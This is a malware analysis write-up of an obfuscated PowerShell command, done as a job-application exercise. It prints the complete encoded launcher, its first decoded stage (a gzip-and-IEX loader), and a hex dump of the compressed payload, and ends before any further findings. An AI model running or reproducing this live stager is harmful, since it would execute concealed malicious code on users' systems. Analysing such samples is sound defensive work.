# Malicious Powershell Analysis

**Date:** April 2nd, 2026

**Author:** Garrett Jones

**Concepts:** Malware, Powershell, VirusTotal, scdbg

## Scenario

This analysis was performed as part of a job application exercise involving a PowerShell-based malware sample. The findings and breakdown below document the investigative process and observations.

> **Note:** This PowerShell command is malicious. It should not be executed outside of a controlled sandbox or analysis environment.

## Analysis

#### Original Command
```
%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEMAMgBKAHAAVwBVAEEALwA2AFYAWABhADQAKwBpAFMAQgBmACsAMwBQADQASwBQAG4AUwBpAFIAcgB1ADkAWAA3AHIAZgBUAEQASwBBAGkAawBoAGoAbwAzAGoAQgA3AHUAMQAwAG8AQwBnAEYAQgBRAHEAaABVAEgARgAzAC8AdgBzAGUAUQBIAHQANwAzAHAAbgBKAFQAcgBJAG0AeABLAHEAaQB6AHUAMgBwADUANQB3ADYAcQBKAGoAZQBxAFQAUwB3AEUAWgBXAEoAaQBaAG0ANwBCAFEANQBDAG0AMwBoAE0AUABaAGUANwA3AFIARwBSAE0AbAArAFkAcgAvAG4AYwBPAHYASQBRAFQAWgBhAFQAdwBmAHMARwAwADMAYwAvAEkATwBoAGQATgA4ADAAQQBoAHkASAB6AFoAKwA1AEcAMABRAFAAZABaAFEAcQAzAEIAegAxADQAZAA0AGsAWgBPAGIAagBNAHAASgBOAGsASQB6AGEAagBBAEIAZAB2AGIAbgBJADMANgBWAEwAawBoAGYAbwBhAHYAMwBzADYAdABRAC8ANAAzAGMAWABVAEkAbQBZAEkAaABnAHEAdgByAE8ALwAzAGkASwB2AGIAMwB0AHYAagBJAHgAOABGAEEAZgBaAG8ATgByADgAWABNAEcAWABEAEUATAB1AEcAWQArAE8AdwBVAEcAVAArAFkAcABZAFcARAB2AEQAZABzADcASABGAGkARABKAC8ATQByAGYAdgA5ADQASgBEAEQATgAyADUAYgBJAHQANQBIAFYAawBRAEUATwB1AFoAeQBiAHMAbgBnAHMAQQBjADgAZQA1AFYAMwA3AEYAcABJAGYALwBIAEgALwBuAGkANgAxADMAdAA3AGIANgAvAGoAMwBRAG4ATABPAFQAVgBPAEsAVABZAHYAVABjAGQASgAxADkAawB2AGgAVQBUAGcANwBQAFkAeAA0AFcAOABiAEsATwBBAGgARwBSAE4ANwA1AGUAMgAxADYAagBmAHoAMQBQAHYAeAA2AG4AegBjAHUAWgA3AHYAbgBpAEoAYgBPAFAAcgBFAE0AZQB2AGcAMAB5ADAAWgBqAEsARgBQAEEAdwBWAHcASQBiAE4ATQBNAHkAWABtAGQAZgBFADMAdQB2AGIARwAvAFAAMQB3ADUAdABwADUARgBIAGIAeABmAGUAaQBSADMARgBBAGYAQgBVAEgAQgB4AHYAaAA4AEgANgBvAGUANgBhAEQAcAAzAGcATgBZAHYAawBRAGoAcwAvAGIANQBJAHYAZwBSAEkAQgBwAEYASABpAFoAQQArAEEATAB5AEIAMwBJAEQAaABkAHUAdgBjAGgAeAB5AHEARAAzADkAWABmADEAdgBoAFgARwArAEgAZwBGADkAMwBlAEYAQwBwACsARgBZAEoAZABDAGcAMgBMADUAdwBvAG4AZgBnAFEATQBZAEMATAB6AEoAMQBFAEUANABQADMAagAvAGkAVgB4AEYAKwBQADEAQQBzAEcATAB1AFcAKwA0AG4AVgBEAFcAeABnAHoAYwA2AHgAZQA4AFUAOABQADMARQAxAGQAegBOAHoAVwBzADYAeABCAEIAUABRAFMARwBoAG4AYwBwADkAWQBhAHAAbABSAGcAWQBuAGQARQBxAEMATwBEAG4ATwBXAFIARABoADQAdABzAC8ANQA1AE8AWgB2AFUAcQBHADUAVgA4AHEAcQBsADIAbABMAGoATABaADgAVwBSACsAZgBHAEYAZQBGADgAUQAyADMAMwBJADMAeABkAHkARgBQAGMAbgA2AHUAeABIAFoAagBvAG0ARAA1AFAAMgB2AHMANgBHAEgAMQA3AGEASABlADcARwBuAHUAegBhADYARQB2ADQANwArAEsAOQBuAGgAdABjAE8AVABCAFAAaQBYADcAZQBOAHcAYwA5AEMALwB2AEkAQwBtADcAMABMAE8AZwBBADQAVQBQAEIASABzAGIANQByADAAdwA5AFoATABuAE8ATwBSAFgARAB1AEkAWABnAEYAbABDAGgAKwA3ADAAeAAyAGgAbwBXADgANgBNAG4AWQBCAGYAeQB5AE8AZABEADAAZABnADEAcABoAHEAKwA3AEwANgBrAFYAWAA2ADAAbgA4ADQAVABMAHYASwBPAEgAWQBaAGwAUgBJAHMAaAB6AFYARwBaAFUAcgBEAHYAWQBMAEQATwBzAEYAOQBxAFgAVgAyAHgARQBTAFQAcABNAE0AdQBiAGkAcgBoAHcANQAxAEUAWgA2AFMASwAvAHEAMwBxADQASgArAFIAbgBTAGkAMgBtAGUAZQBKAEEAeABFAFkATABUAEIAUgBoAG0AcQBvACsAUgByAFQAcwBKAEsAbQBWAG0AYQBKAHUAWQBpADEAVgA3AGMAMwBYAGgAawA1AEYAUABtAFAAQwA2ADQAMABEAEsAZwBhAFkARABuAEEAbQBzAEoARgBpAG8ATgBPAEYATQBBAE4ANwArAEgAegArAEsAOQAxAEIAawBSAGQAZAAzAHMAQQB1ADcAMAB5AG8AMABjAFAAUQBOADEASgB4AEwAUgBxAFYAMAAwAHoAZgBZAC8ASwBnAGoAUAAzAEgANwBtAGkAZABaAFUAaQBSAFkAWABVAEgANgA1AEQAUQBRAFEASABVAEkATABUAE0ATABPADYAQgBRADEAeABMAGMALwA0ADkANAAvADgAMgA5ADcAMAB2AE0AZAAyADcAeQBBAGIANABjAFoAQwBGAE4AeABGAGMAdQBwAGsAbQA2AHAARAB0AFIAYwByAGsAQQBwAFMAOQBZAHAAcwBnAEYARgBGAEEAYgBCAE0AVABsADkAQgBDADMAbQA4AGsAdAA1AEcAMABLACsAVwAzAHIAMABFAGEATgA4AGIAbABmADIAUwA4AG4AKwA3ADUAVwA0AGcAYwA5AGUAQwByAHcAZQBDAFYAMgBZAEsAegBsAFMAVwBzAHgAbAArAFIASgBvAEsAeABuAEoAMQBGAEIAaQA0AGQAWgBHAEoAeABLAEsARgBDAG4AbQA3AGkALwBnADMAMwBiAFUAbQArAGcAbwBMADMAUwBsAEkAKwBIAGUAbgBoAEUATABiAFMAWABZAFkAMABHAEoAWgA3AE8AMABKADYAZgB6AE0ANQBCAGMAMQBxAHgAWQB2ACsAaQBKADUATwBmAFAAdQAyAE8AKwBoAEMAeAA3AFMAZQBWAGIAVwBtAGMAMwAwAC8AMgBhADIAagBQAEwAawByAEQAYgBoAFAARwBCADcAVAB2AE4AVQAyAFEASQB4AFgAUwBXAE4AUQBRAGsAVABoAHgATAA2AG0AUwB2AEkAdgBEAFUARgBwAGIAbABxAHYATQBJACsARgBVAFgAWABJAE4AMgBlAEEANABZAGcAbwAyAE0AcABUAGoAZABHAEcASwBzAGUAdABDAFQAQgBBAFgAdgArAFUAbgB1AHgARQA4AFEAbgBYAG4AOABGAFMAVgBmAFQALwBRAGsAbgBpAGwAdgB0AFEAVwBiAGYARQBGADgAYQBJAHQAZABLADAAWQBOAGUAUwBOAGUAQQBwADMAcABTAGkAdQBiAGEAWABWADEAagAwADgAZwBMAHgATQBBAEIATgBMAGEASQB5ADUAcwBJAEkAcwBVAGUAMQB2AFIARgBVADIAWABQADcARgBWAE0ARgBHAEsAZABDAE8ASQBTADgAYgAzAFMAcAAzAFIAcABYADkAVABOAEQAUQBWAGwAZwBlAEgAZQBHADQAcQBuAFgAVwBTADkAbQAzAFQANgBsADkAWQBYAFgAYwBqAEsAYQBRAC8AYwB0AFEAMwBFAHAARwBQAFcAeQBjAEcANQBFADIATwBxAE8AcQBKAEQAKwBRACsAZABDAHMANwBDAFYAMwBTAEkAeQA2AG8AVQArAGYAUwBLAEoAWABOAE0AYQBPAFMAQwBjAHcAbgBwAEQAagBUAHQAQQBtADkAZwBqAHMAbgBuAGgAMQBoAHMASAB1AGUAVABoAEcARQBJAE4ARQAyAFoAZQBxAEYARAAvAHIAdgBCAGoATAAyADcANABrAHUAOQBFAEkANABuAGoAVwBJAHcAOQAwAHQAMABLADAAaABYAFcAdAB0AC8ASgBIADMATwBJAHMAYwBLAGYAbQBhAEcAegBOAHUALwBMAFQAcwBGAHAAWgArAHEAWAA2AHMAMwBZADYAYgByAEcARgBEADgAdgA5ADUASwBCAEcAVQBkAGcANgBVADQARgBZAEIAOAB2AGQAOQArAFQAdABLAE8AVABjADQAVwBvAHgANwBHADYARQBxAEMAVwBYADYAdQB4AFQAeAAxAGMAYQBoADgATwBvAFcAagBKADcAMwBhAEQAYgA0AG4AWQBIAFMALwBKAGEAdgBFAEYAcQArAGcAbgBQAEsANQByAHMAcwB0AHkASwAwADcAYgBpAGYARwBCAFYAaAArAHAAQwBMAGcAMwBaAG4AVAA0ADgAZABWAFcAdAAvADIASgBPAGEAbQBPAGoAegB4ADAAeABlAHgASwBIAGcAdABWAGYARAAzAGIAVwBUAEwASABaADkAdABnAFoAUwA5AHAAOABMAE0ANwBqAGkAVAA2AGMASQBzAFMAeAAzAEUAeABSAHoAZABsADAAVQBlAFAAVgBnAGUAeQB4AFUANgBJAGwAKwBsAEkAZABWAFcAcwBtAHoANAA3AHQAOABjADQAWAB4AFIAaQBkAHgASQBWAGYAdwB0AG8AegA0AGMATABEAFEAbABEAGEAMwBLAHIAeQBJAG4AWQA1ADcAVQBqAEYANQA3ADMAUQBkAEcAYQBEAFIAcgB0AGkAZABiAHEAMQBTAEkAMgBrAEoAKwBRAHMAeQBVAE8ALwBIAGMAOABQADQANwA0ADQAMQBsADQAbQA2AC8AbQBxAHEAYQAyADEANgBYADYAdAAxAGwAbgBOAEoAcQB2AFIAdwA4AGkAUgBtAG4AYQBuAG8AbgBKAEIANgB5AFYAYwA5AEIAcwBlAE0ATgB4ADIAeABxAEgAaABWADgAegB1AFkAdgBNAGkAYQB0AE8AVwBpAG8AVABGAFQAZwB5AFEASgB1AG4AagBRADIAZQB5AE0AKwBYAG0AcwBzAFAAdgBhAHQAaQBlAE8AaQAzAFAAZABvAHgAcAA3AGUARABiAHQARwBhAFkAaABxAFUANABMACsAMQBwAG8ANgA1ADAAZAByAE8AYQB0AEQAeAB5AG4AZQBsADYAaABzACsAbQBXADcAVQBFACsANQBrAGIAcQArAG8AVABVAGwAMQB1AE0AeABCAEUAWgBlAGEAVAAzAGwAUABvAGIAWgBVAGwAUABqAC8AMABqAEYASABGADYATwA4ADYAVQBBADUAaQBhAGQARgBaAGQAcQBaAE4AKwBTAEEAagBqAGkAeABxAFIAegByAFoAQgB0AEsAcQBaAGkAeQAxADAAZgA2AEkARABhAEcAaQBkAEMAVABuAHAAVABmAHEAeABlADAASgBHADkAVgBGAEwAcAB6AGIAKwArAE8AegBXAEEAcABPAHIAZABuAG8ATABEAFEAVgBvAGEAbwBDAEYANgAzAGQARwBYAGkAOABCAFUANABiADgASgB4AFIAUABEAEcAawBCADcAUgB4AGcARwBOAE4AMgBVADkAeQA1AFkAegAyAHgAQgBhAFYALwBYAHoARQAwAGYATQBjADUAaQBJAC8ATgAxAFoAWQBhACsAOQBXAHMAZgBzAFEAeQBFAE8ANgB0AHEAbwBvADYARQBHAE8ANgAwAHUAcAB3AHgAcwBsADAAcABhADMAWABGADgAZAAxAEsAcAA0AHkASwBFAGwAZQAxAHkAeABRAHEAMgBxAEQANABkAHAANwBoADIAVABDAHIAWQBtAEEAZgBRAGsAcAArAFMAZQAvAHgAOABEAC8AMwBjAE8AegBhAHAAWgBVAHEATwBnAE0AawBIAFIAUwA5AFoATABwAFcATABTAEsAMwB5ADgAZQBiADAAOQB2AFYAMQA3AHUANAAvADUAbgBYAEUAQwBiAGIAVgBhAEsAeQBsADQANgBhAHQARAAwAGcARAArAFcANQBzAGwANgAwAEYAbwA2AFEANgBVAFAAKwBoADYAcgBuAGYAVwBnAEEAUwBEAFMAKwArAGkARQBEAHUAUgBLAEIAUgArADMAbQA3AHYAYwBPAEIAaABCADEAcABSAGEARgBhAHYAbABaADUAMQBIAEkASwBTAGIAdQBzAFgAYgBRAC8AMABmAGwAbABIADkAZwBZADMAMgBoAHkARwBqAGYAcABQAFIAMABYAG8AdwBpADgAYgBvAGMAWABLAFkAagBLAGkAOQBUAHIAdABTAEMANABSAFgAaAB1AHoANgA4AGIASAB4AHgAYwBJADcAMwBLAHgAcABDAGcAKwBZAFcAOQBEAHIAVABKAFQAUABUAFcAcQBWAFcAaQBuAHEAcQBkAG0AdABaAGoANwBmAFYAaAA0ADQAcwBkAFoAdQA1AGUAbwBBAC8AbQBMADgAcwB5AFQAegA1AGEAYwAxAEIASQBjAGEAMwBiAFAAUgBaADcANwArAFoANwA1AHIAdwBmAHcAbgBkAEYALwBoAHoAWQBCAEwAMgAzAHEAUABxAEIATABIAGYAbwA1AFgAcwBWAGMALwBtAHMAdQBKADYANwAvAEEAZgB6AHgATQBiAFQAUAA4AE0AbQBDADkAMAB3ADMASgBWADkASQA5AFkARABlAGIAWQBrAEIAMwB6AGYAcABoAFYAMgA0ADEAWQB1AE0AMgBOAGUAWQBXADUAMwA1AHgAdAB4AEIAZQBHAHoAWQBxAE0ATgBIAFQAcgBDAEoAawB0AHUAYgB5AGIANwBaAC8AbQBLAE8AdQBwADAASgAvAHMAVgBNAE0AYwBMAFEAYwA5ACsATgBpAEEARQBzAHgAZABDAEUASgBhAHAAVABKAGMAbgBtADMATABmAGMAMwB3AG8ANAB0AFMANABFAEQAZwBBAEEAIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA
```

`echo ‘JABzAD0’ | base64 -d`

#### Base64 Decode 1
<pre style="white-space: pre-wrap; word-break: break-word;">
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();base64:
</pre>

`echo ‘H4sIAC2J…’ | base64 -d | xxd`

#### Base64 Decode 2
```
00000000: 1f8b 0800 2d89 a565 00ff a557 6b8f a248  ....-..e...Wk..H
00000010: 17fe dcfe 0a3e 74a2 46bb bd5f badf 4c32  .....>t.F.._..L2
00000020: 808a 4863 a378 c1ee ed74 a028 0505 0aa1  ..Hc.x...t.(....
00000030: 5071 77fe fb1e 407b 7bde 99c9 4eb2 26c4  Pqw...@{{...N.&.
00000040: aaa2 ceed a9e7 9c3a a898 dea9 34b0 1195  .......:....4...
00000050: 8989 99bb 050e 429b 784c 3d97 bbed 1191  ......B.xL=.....
00000060: 325f 98af f9dc 3af2 104d 9693 c1fb 06d3  2_....:..M......
00000070: 773f 20e8 5d37 cd00 8721 f367 ee46 d103  w? .]7...!.g.F..
00000080: dd65 0ab7 073d 7877 8919 39b8 cca4 9364  .e...=xw..9....d
00000090: 2336 a300 176f 6e72 37e9 52e4 85fa 1abf  #6...onr7.R.....
000000a0: 7b3a b50f f8dd c5d4 2266 0886 0aaf acef  {:......"f......
000000b0: f788 abdb dedb e323 1f05 01f6 6836 bf17  .......#....h6..
000000c0: 3065 c310 bb86 63e3 b050 64fe 6296 160e  0e....c..Pd.b...
000000d0: f0dd b3b1 c588 327f 32b7 eff7 8243 0cdd  ......2.2....C..
000000e0: b96c 8b79 1d59 1010 eb99 c9bb 2782 c01c  .l.y.Y......'...
000000f0: f1ee 55df b169 21ff c71f f9e2 eb5d eded  ..U..i!......]..
00000100: bebf 8f74 272c e4d5 38a4 d8bd 371d 275f  ...t',..8...7.'_
00000110: 64be 1513 83b3 d8c7 85bc 6ca3 8084 644d  d.........l...dM
00000120: ef97 b6d7 a8df cf53 efc7 a9f3 72e6 7bbe  .......S....r.{.
00000130: 7889 6ce3 eb10 c7af 834c b466 3285 3c0c  x.l......L.f2.<.
00000140: 15c0 86cd 30cc 9799 d7c4 deeb db1b f3f5  ....0...........
00000150: c39b 69e4 51db c5f7 a247 7140 7c15 0707  ..i.Q....Gq@|...
00000160: 1be1 f07e a87b a683 a778 0d62 f910 8ecf  ...~.{...x.b....
00000170: dbe4 8be0 4480 6914 7899 03e0 0bc8 1dc8  ....D.i.x.......
00000180: 0e17 6ebd c871 caa0 f7f5 77f5 be15 c6f8  ..n..q....w.....
00000190: 7805 f777 850a 9f85 6097 4283 62f9 c289  x..w....`.B.b...
000001a0: df81 0318 08bc c9d4 4138 3f78 ff89 5c45  ........A8?x..\E
000001b0: f8fd 40b0 62ee 5bee 2754 35b1 8337 3ac5  ..@.b.[.'T5..7:.
000001c0: ef14 f0fd c4d5 dccd cd6b 3ac4 104f 4121  .........k:..OA!
000001d0: a19d ca7d 61aa 6546 0627 744a 8238 39ce  ...}a.eF.'tJ.89.
000001e0: 5910 e1e2 db3f e793 99bd 4a86 e55f 2aaa  Y....?....J.._*.
000001f0: 5da5 2e32 d9f1 647e 7c61 5e17 c436 df72  ]..2..d~|a^..6.r
00000200: 37c5 dc85 3dc9 fabb 11d9 8e89 83e4 fdaf  7...=...........
00000210: b3a1 87d7 b687 7bb1 a7bb 36ba 12fe 3bf8  ......{...6...;.
00000220: af67 86d7 0e4c 13e2 5fb7 8dc1 cf42 fef2  .g...L.._....B..
00000230: 029b bd0b 3a00 3850 f047 b1be 6bd3 0f59  ....:.8P.G..k..Y
00000240: 2e73 8e45 70ee 2178 0594 287e ef4c 7686  .s.Ep.!x..(~.Lv.
00000250: 85bc e8c9 d805 fcb2 39d0 f476 0d69 86af  ........9..v.i..
00000260: bb2f a915 5fad 27f3 84cb bca3 8761 9951  ./.._.'......a.Q
00000270: 22c8 7354 6654 ac3b d82c 33ac 17da 9757  ".sTfT.;.,3....W
00000280: 6c44 493a 4c32 e6e2 ae1c 39d4 467a 48af  lDI:L2....9.FzH.
00000290: eade ae09 f919 d28b 699e 7890 3111 82d3  ........i.x.1...
000002a0: 0518 66aa 8f91 ad3b 092a 6566 689b 988b  ..f....;.*efh...
000002b0: 557b 7375 e193 914f 98f0 bae3 40ca 81a6  U{su...O....@...
000002c0: 039c 09ac 2458 a834 e14c 00de fe1f 3f8a  ....$X.4.L....?.
000002d0: f750 6445 d777 b00b bbd3 2a34 70f4 0dd4  .PdE.w....*4p...
000002e0: 9c4b 46a5 74d3 37d8 fca8 233f 71fb 9a27  .KF.t.7...#?q..'
000002f0: 5952 2458 5d41 fae4 3410 4075 082d 330b  YR$X]A..4.@u.-3.
00000300: 3ba0 50d7 12dc ff8f 78ff cdbd ef4b cc77  ;.P.....x....K.w
00000310: 6ef2 01be 1c64 214d c457 2ea6 49ba a43b  n....d!M.W..I..;
00000320: 5172 b900 a52f 58a6 c805 1450 1b04 c4e5  Qr.../X....P....
00000330: f410 b79b c92d e46d 0af9 6deb d046 8df1  .....-.m..m..F..
00000340: b95f d92f 27fb be56 e207 3d78 2af0 7825  ._./'..V..=x*.x%
00000350: 7660 ace5 496b 3197 e449 a0ac 6727 5141  v`..Ik1..I..g'QA
00000360: 8b87 5918 9c4a 2850 a79b b8bf 837d db52  ..Y..J(P.....}.R
00000370: 6fa0 a0bd d294 8f87 7a78 442d b497 618d  o.......zxD-..a.
00000380: 0625 9ece d09e 9fcc ce41 735a b162 ffa2  .%.......AsZ.b..
00000390: 2793 9f3e ed8e fa10 b1ed 2795 6d69 9cdf  '..>......'.mi..
000003a0: 4ff6 6b68 cf2e 4ac3 6e13 c607 b4ef 354d  O.kh..J.n.....5M
000003b0: 9023 15d2 58d4 1091 3871 2fa9 92bc 8bc3  .#..X...8q/.....
000003c0: 505a 5b96 abcc 23e1 545d 720d d9e0 3862  PZ[...#.T]r...8b
000003d0: 0a36 3294 e374 618a b1eb 424c 1017 bfe5  .62..ta...BL....
000003e0: 27bb 113c 4275 e7f0 5495 7d3f d092 78a5  '..<Bu..T.}?..x.
000003f0: bed4 166d f105 f1a2 2d74 ad18 35e4 8d78  ...m....-t..5..x
00000400: 0a77 a528 ae6d a5d5 d63d 3c80 bc4c 0013  .w.(.m...=<..L..
00000410: 4b68 8cb9 b082 2c51 ed6f 4455 365c fec5  Kh....,Q.oDU6\..
00000420: 54c1 4629 d08e 212f 1bdd 2a77 4695 fd4c  T.F)..!/..*wF..L
00000430: d0d0 5658 1e1d e1b8 aa75 d64b d9b7 4fa9  ..VX.....u.K..O.
00000440: 7d61 75dc 8ca6 90fd cb50 dc4a 463d 6c9c  }au......P.JF=l.
00000450: 1b91 363a a3aa 243f 90f9 d0ac ec25 7748  ..6:..$?.....%wH
00000460: 8cba a14f 9f48 a257 34c6 8e48 2730 9e90  ...O.H.W4..H'0..
00000470: e34e d026 f608 ec9e 7875 86c1 ee79 3846  .N.&....xu...y8F
00000480: 1083 44d9 97aa 143f ebbc 18cb dbbe 24bb  ..D....?......$.
00000490: d108 e278 d623 0f74 b742 b485 75ad b7f2  ...x.#.t.B..u...
000004a0: 47dc e22c 70a7 e668 6ccd bbf2 d3b0 5a59  G..,p..hl.....ZY
000004b0: faa5 fab3 763a 6eb1 850f cbfd e4a0 4651  ....v:n.......FQ
000004c0: d83a 5381 5807 cbdd f7e4 ed28 e4dc e16a  .:S.X......(...j
000004d0: 31ec 6e84 a825 97ea ec53 c757 1a87 c3a8  1.n..%...S.W....
000004e0: 5a32 7bdd a0db e276 074b f25a bc41 6afa  Z2{....v.K.Z.Aj.
000004f0: 09cf 2b9a ecb2 dc8a d3b6 e27c 6055 87ea  ..+........|`U..
00000500: 422e 0dd9 9d3e 3c75 55ad ff62 4e6a 63a3  B....><uU..bNjc.
00000510: cf1d 317b 1287 82d5 5f0f 76d6 4cb1 d9f6  ..1{...._.v.L...
00000520: d819 4bda 7c2c cee3 893e 9c22 c4b1 dc4c  ..K.|,...>."...L
00000530: 51cd d974 51e3 d581 ecb1 53a2 25fa 521d  Q..tQ.....S.%.R.
00000540: 556b 26cf 8eed f1ce 17c5 189d c485 5fc2  Uk&..........._.
00000550: da33 e1c2 c342 50da dcaa f222 7639 ed48  .3...BP...."v9.H
00000560: c5e7 bdd0 7466 8346 bb62 75ba b548 8da4  ....tf.F.bu..H..
00000570: 27e4 2cc9 43bf 1dcf 0fe3 be38 d65e 26eb  '.,.C......8.^&.
00000580: f9aa a9ad b5e9 7ead d659 cd26 abd1 c3c8  ......~..Y.&....
00000590: 919a 76a7 a272 41eb 255c f41b 1e30 dc76  ..v..rA.%\...0.v
000005a0: c6a1 e157 ccee 62f3 226a d396 8a84 c54e  ...W..b."j.....N
000005b0: 0c90 26e9 e343 67b2 33e5 e6b2 c3ef 6ad8  ..&..Cg.3.....j.
000005c0: 9e3a 2dcf 768c 69ed e0db b466 9886 a538  .:-.v.i....f...8
000005d0: 2fed 69a3 ae74 76b3 9ab4 3c72 9de9 7a86  /.i..tv...<r..z.
000005e0: cfa6 5bb5 04fb 991b abea 1352 5d6e 3310  ..[........R]n3.
000005f0: 4465 e693 de53 e86d 9525 3e3f f48c 51c5  De...S.m.%>?..Q.
00000600: e8ef 3a50 0e62 69d1 5976 a64d f920 238e  ..:P.bi.Yv.M. #.
00000610: 2c6a 473a d906 d2aa 662c b5d1 fe88 0da1  ,jG:....f,......
00000620: a274 24e7 a537 eac5 ed09 1bd5 452e 9cdb  .t$..7......E...
00000630: fbe3 b358 0a4e add9 e82c 3415 a1aa 0217  ...X.N...,4.....
00000640: addd 1978 bc05 4e1b f09c 513c 31a4 07b4  ...x..N...Q<1...
00000650: 7180 634d d94f 72e5 8cf6 c416 95fd 7cc4  q.cM.Or.......|.
00000660: d1f3 1ce6 223f 3756 586b ef56 b1fb 10c8  ...."?7VXk.V....
00000670: 43ba b6aa 28e8 418e eb4b a9c3 1b25 d296  C...(.A..K...%..
00000680: b75c 5f1d d4aa 78c8 a125 7b5c b142 adaa  .\_...x..%{\.B..
00000690: 0f87 69ee 1d93 0ab6 2601 f424 a7e4 9eff  ..i.....&..$....
000006a0: 1f03 ff77 0ecd aa59 52a3 a032 41d1 4bd6  ...w...YR..2A.K.
